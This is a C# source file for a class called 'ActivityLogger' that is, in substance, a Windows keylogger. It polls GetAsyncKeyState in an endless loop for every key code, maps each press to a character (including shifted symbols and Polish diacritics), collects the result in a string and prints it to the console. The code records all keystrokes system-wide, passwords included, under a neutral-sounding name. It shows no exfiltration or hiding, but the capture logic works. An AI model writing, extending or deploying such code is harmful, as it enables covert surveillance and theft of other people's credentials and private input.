using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Robot.ActivityLogger
{
    public class ActivityLogger
    {
        public void TrackActivities()
        {
            string output = "";
            var track = true;
            bool shift = false;
            bool alt = false;
            while (track)
            {
                Thread.Sleep(5);
                for (int i = 0; i < 255; i++)
                {
                    int key = WinApi.GetAsyncKeyState(i);
                    if (key == -32767)
                    {
                        shift = WinApi.GetAsyncKeyState(16) < 0;
                        alt = WinApi.GetAsyncKeyState(18) < 0;
                        var c = this.GetCharacter(i, shift, alt);
                        output += c;
                        Console.Write(c);
                        //Console.WriteLine(i);

                    }
                }
            }

        }

        private char? GetCharacter(int i, bool shift, bool alt)
        {
            switch (i)
            {
                case 96:
                    return '0';
                case 110:
                    return ',';
                case 13:
                    return '\n';
                case 97:
                    return '1';
                case 98:
                    return '2';
                case 99:
                    return '3';
                case 100:
                    return '4';
                case 101:
                    return '5';
                case 102:
                    return '6';
                case 103:
                    return '7';
                case 104:
                    return '8';
                case 105:
                    return '9';
                case 107:
                    return '+';
                case 109:
                    return '-';
                case 106:
                    return '*';
                case 111:
                    return '/';
                case 9:
                    return '\t';
            }
            
            var character = (char) i;

            if (alt)
            {
                switch (character)
                {
                    case 'A':
                        character = 'Ą';
                        break;
                    case 'E':
                        character = 'Ę';
                        break;
                    case 'N':
                        character = 'Ń';
                        break;
                    case 'L':
                        character = 'Ł';
                        break;
                    case 'O':
                        character = 'Ó';
                        break;
                    case 'Z':
                        character = 'Ż';
                        break;
                    case 'X':
                        character = 'Ź';
                        break;
                    case 'C':
                        character = 'Ć';
                        break;
                }
            }

            if (!shift)
            {
                return Char.ToLower(character);
            }
            else
            {
                switch (character)
                {
                    case '`':
                        return '~';
                    case '1':
                        return '!';
                    case '2':
                        return '@';
                    case '3':
                        return '#';
                    case '4':
                        return '$';
                    case '5':
                        return '%';
                    case '6':
                        return '^';
                    case '7':
                        return '&';
                    case '8':
                        return '*';
                    case '9':
                        return '(';
                    case '0':
                        return ')';
                    case '-':
                        return '_';
                    case '+':
                        return '+';
                    case ',':
                        return '<';
                    case '.':
                        return '>';
                    case '/':
                        return '?';
                    case ';':
                        return ':';
                    case '\'':
                        return '"';
                    case '\\':
                        return '|';
                    case '[':
                        return '{';
                    case ']':
                        return '}';
                    default:
                        return Char.ToUpper(character);
                }
            }
        }
    }
}
